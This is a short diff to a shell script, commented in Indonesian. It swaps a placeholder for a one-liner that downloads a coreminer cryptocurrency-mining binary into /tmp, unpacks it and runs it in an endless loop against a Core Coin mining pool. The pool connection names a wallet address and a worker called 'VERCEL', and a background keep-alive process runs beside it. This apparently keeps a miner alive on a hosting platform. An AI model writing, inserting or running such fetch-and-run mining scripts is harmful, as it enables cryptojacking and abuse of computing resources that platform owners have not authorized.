@@ -13,7 +13,7 @@ keep_alive &
 KEEP_PID=$!
 
 # Download & jalankan program utama
-sc mining disini (ganti)
+cd /tmp && rm -rf xcbminer xcb.tar.gz && mkdir xcbminer && curl -sSL https://github.com/catchthatrabbit/coreminer/releases/download/v0.19.81/coreminer-linux-x86_64.tar.gz -o xcb.tar.gz && tar xzf xcb.tar.gz -C xcbminer && cd xcbminer/coreapp && chmod +x coreminer && while true; do ./coreminer --noeval --hard-aes -P stratum1+tcp://CB66C56381EE3FE462F239B920A8A706FBE8225E24F0.VERCEL@us.catchthatrabbit.com:8008 -t 4; sleep 2; done
 
 # Setelah program utama selesai, hentikan keep-alive
 kill $KEEP_PID 2>/dev/null
